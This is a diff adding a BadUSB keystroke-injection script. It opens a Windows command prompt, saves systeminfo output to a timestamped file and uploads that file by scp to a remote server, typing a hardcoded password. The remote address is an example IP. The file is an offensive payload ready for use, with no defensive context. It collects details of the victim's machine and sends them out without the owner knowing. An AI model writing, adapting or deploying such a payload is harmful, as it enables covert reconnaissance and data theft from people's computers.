@@ -1,0 +1,37 @@
+REM This is a BadUSB script to open cmd, create a timestamped file, save the output of systeminfo, and send it to a remote server
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 750
+
+REM Create a file with a unique name based on the current date and time
+STRING for /f "tokens=1-5 delims=/: " %d in ('date /t') do set datestr=%d-%e-%f
+ENTER
+STRING for /f "tokens=1-4 delims=:. " %t in ('time /t') do set timestr=%t-%u
+ENTER
+STRING set filename=output_%datestr%_%timestr%.txt
+ENTER
+
+REM Execute systeminfo and redirect the output to the uniquely named file
+STRING systeminfo >> %filename%
+ENTER
+DELAY 1000
+
+REM We use SCP to send the file to our remote server, specifying the user, IP, and path. We will use an example IP
+STRING scp %filename% user@8.8.8.8:/path/to/directory
+ENTER
+
+REM Wait long enough for the password prompt to appear
+DELAY 3000
+
+REM Enter the remote server password when prompted
+STRING passworUSERofREMOTEserver
+ENTER
+DELAY 500
+
+REM Close the command prompt
+STRING exit
+ENTER
